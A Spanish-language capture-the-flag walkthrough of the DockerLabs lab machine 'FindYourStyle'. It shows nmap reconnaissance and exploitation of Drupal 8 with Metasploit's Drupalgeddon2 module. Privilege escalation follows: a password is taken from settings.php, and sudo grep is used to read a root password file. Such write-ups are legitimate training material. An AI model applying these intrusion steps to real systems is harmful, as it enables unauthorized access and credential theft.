#MAQUINA #DOCKERLABS #FACIL 
#DRUPAL
#MSFCONSOLE
<hr>

# RECONOCIMIENTO

Vamos a resolver **FindYourStyle** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 13:09 CET
Initiating ARP Ping Scan at 13:09
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 13:09, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:09
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 13:09, 0.48s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-10 13:09:03 CET for 0s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.64 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 172.17.0.2                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 13:09 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000026s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.txt /web.config /admin/ 
| /comment/reply/ /filter/tips/ /node/add/ /search/ /user/register/ 
| /user/password/ /user/login/ /user/logout/ /index.php/admin/ 
|_/index.php/comment/reply/
|_http-title: Welcome to Find your own Style | Find your own Style
|_http-server-header: Apache/2.4.25 (Debian)
|_http-generator: Drupal 8 (https://www.drupal.org)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.58 seconds


```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 13:09 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /rss.xml: RSS or Atom feed
|   /robots.txt: Robots file
|   /: Drupal version 8 
|   /README.txt: Interesting, a readme.
|_  /contact/: Potentially interesting folder
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 24.27 seconds

whatweb "http://172.17.0.2/"
http://172.17.0.2/ [200 OK] Apache[2.4.25], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTML5, HTTPServer[Debian Linux][Apache/2.4.25 (Debian)], IP[172.17.0.2], MetaGenerator[Drupal 8 (https://www.drupal.org)], PHP[7.2.3], PoweredBy[-block], Script, Title[Welcome to Find your own Style | Find your own Style], UncommonHeaders[x-drupal-dynamic-cache,x-content-type-options,x-generator,x-drupal-cache], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/7.2.3], X-UA-Compatible[IE=edge]

```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** **Drupal 8** .

# EXPLOTACION

Al buscar con **msfconsole**:
```bash
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > search drupal 8

Matching Modules
================

   #   Name                                           Disclosure Date  Rank       Check  Description
   -   ----                                           ---------------  ----       -----  -----------
   0   exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
   
```

Lo usamos y ponemos el LHOST y RHOST

# ESCALADA PRIVILEGIOS

Buscamos entre los archivos del drupal para escalar:
   ```bash
www-data@eb1103dfdb86:/var/www/html/sites/default$ cat settings.php | grep "pass"
 * to replace the database username and password and possibly the host and port
 *   'password' => 'ballenitafeliz', //Cuidadito cuidadín pillin
 * username, password, host, and database name.
 *     'password' => 'sqlpassword',
 * You can pass in the user name and password for basic authentication in the
 * bypassing the proxy, in $settings['http_client_config']['proxy']['no'].
# $settings['http_client_config']['proxy']['http'] = 'http://proxy_user:proxy_pass@example.com:8080';
# $settings['http_client_config']['proxy']['https'] = 'http://proxy_user:proxy_pass@example.com:8080';
 * malicious client could bypass restrictions by setting the
 * HTTP proxy, and bypass the reverse proxy if one is used) in order to avoid

```

YA ESTAMOS COMO BALLENITA.

Buscamos archivos con permisos SUDO:
   ```bash
ballenita@eb1103dfdb86:/var/www/html/sites/default$ sudo -l
Matching Defaults entries for ballenita on eb1103dfdb86:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ballenita may run the following commands on eb1103dfdb86:
    (root) NOPASSWD: /bin/ls, /bin/grep
```

Vemos **ls y grep** con permisos SUDO :
   ```bash
ballenita@eb1103dfdb86:/var/www/html/sites/default$ sudo ls /root
secretitomaximo.txt
ballenita@eb1103dfdb86:/var/www/html/sites/default$ sudo grep '' /root/secretitomaximo.txt
nobodycanfindthispasswordrootrocks
ballenita@eb1103dfdb86:/var/www/html/sites/default$ su root
Password: 
root@eb1103dfdb86:/var/www/html/sites/default# whoami
root
root@eb1103dfdb86:/var/www/html/sites/default# 

```

**YA ESTAMOS COMO ROOT.**